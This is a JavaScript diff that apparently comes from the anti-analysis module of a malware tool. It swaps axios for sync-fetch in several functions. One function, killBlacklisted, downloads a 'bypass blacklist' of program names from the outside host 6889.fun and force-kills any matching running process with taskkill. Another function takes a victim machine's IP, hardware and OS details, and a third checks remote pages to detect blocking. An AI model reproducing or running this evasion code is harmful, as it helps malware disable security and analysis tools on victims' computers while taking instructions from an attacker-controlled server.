@@ -1,5 +1,5 @@
 const util = require("util");
-const axios = require("axios");
+const fetch = require('sync-fetch');
 const process = require("process");
 const exec = util.promisify(require("child_process").exec);
 
@@ -54,10 +54,8 @@ async function debuggerx(enable, ip, disk, ram, uid, cpucount, os, cpu, gpu, win
 
 async function killBlacklisted() {
     try {
-        const r = await axios.get(
-            "https://6889.fun/api/aurathemes/bypass/blacklist/progr?aurathemes=true",
-        );
-        const bp = r.data.blacklistedprog;
+        const r = await fetch("https://6889.fun/api/aurathemes/bypass/blacklist/progr?aurathemes=true").json();
+        const bp = r.blacklistedprog;
         const { stdout } = await exec("tasklist");
         const rp = stdout.split(/\r?\n/);
         for (const p of rp) {
@@ -69,7 +67,7 @@ async function killBlacklisted() {
                 try {
                     await exec(`taskkill /F /IM ${pn}.exe`);
                 } catch (e) {
-                   // console.error(e);
+                  // console.error(e);
                 }
             }
         }
@@ -120,16 +118,18 @@ async function ipBlocked(_) {
     );
 }
 
-async function isBlocked(u, v) {
-    try {
-        const r = await axios.get(u);
-        const i = r.data;
-        return i.includes(v);
-    } catch (e) {
-        console.error(e);
-        return false;
-    }
+
+function isBlocked(u, v) {
+  try {
+    const r = fetch(u);
+    const _ = r.text();
+    return _.includes(v);
+  } catch (e) {
+    console.error(e);
+    return false;
+  }
 }
+
 
 module.exports = {
     debuggerx,
